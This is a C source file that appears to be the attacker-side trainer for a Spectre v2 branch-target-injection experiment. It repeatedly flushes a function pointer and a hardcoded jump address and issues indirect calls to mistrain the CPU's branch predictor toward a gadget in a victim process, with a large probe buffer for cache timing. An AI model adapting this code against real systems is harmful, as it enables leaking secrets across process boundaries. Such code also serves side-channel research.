#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include "common.h"

//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));

//uint64_t foo = 7;
uint8_t probe_buf[256*4096*1024];

/*
 * This is the target of the indirect call
 * which we locate at the address of a gadget
 * in the "victim" process we are trying to
 * (mis)train the processor's BTB to call
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    //asm volatile("movb (%%rbx), %%al\n" :: "b"(&probe_buf[200*4096*1024]) : "rax");
}

//void __attribute__((section (".fnptr"))) (*fn_ptr)(void); // we'll set this = target_fn, and cflush it
uint64_t jmp_ptr;


void train()
{
    fn_ptr = target_fn;
    jmp_ptr = 0x400e60;
    while (1) {
        _mm_clflush(fn_ptr);
        _mm_clflush(&jmp_ptr);
        indirect(&jmp_ptr);
        //usleep(10);
    }
}


void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{

    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);

    fn_ptr = target_fn;
    printf("&fn_ptr = %p\n", &fn_ptr);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);
    printf("target_fn = %p\n", target_fn);

    printf("training...\n");

    train();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
